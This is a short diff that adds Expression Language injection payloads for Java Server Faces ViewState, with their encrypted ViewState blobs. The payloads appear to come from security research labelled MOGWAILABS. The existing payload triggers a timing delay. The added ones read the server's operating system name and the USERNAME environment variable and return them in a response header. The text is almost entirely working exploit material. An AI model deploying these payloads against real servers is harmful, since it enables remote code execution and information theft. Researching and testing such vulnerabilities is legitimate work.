@@ -77,4 +77,9 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGp
 payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\",java.lang.Thread.sleep(10000))}")
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70wvmvyPtGWg5SUeqb4pGmNfKu62L71TrP2SuBPZ3YcodeI+//6rtsvU=
 
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", java.lang.System.getProperty(\"os.name\"))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70/K2EGPqhiskXXGwcA/myLUrT5Mecn23V32zArrxdijCHl1h2C/dChohcCplysFFXw==
 
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", java.lang.System.getenv(\"USERNAME\"))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70/K2EGPqhiskXXGwcA/myLUrT5Mecn23V/z8htdW9rwt4QWXMFe8QZjxkUILgKvxkw==
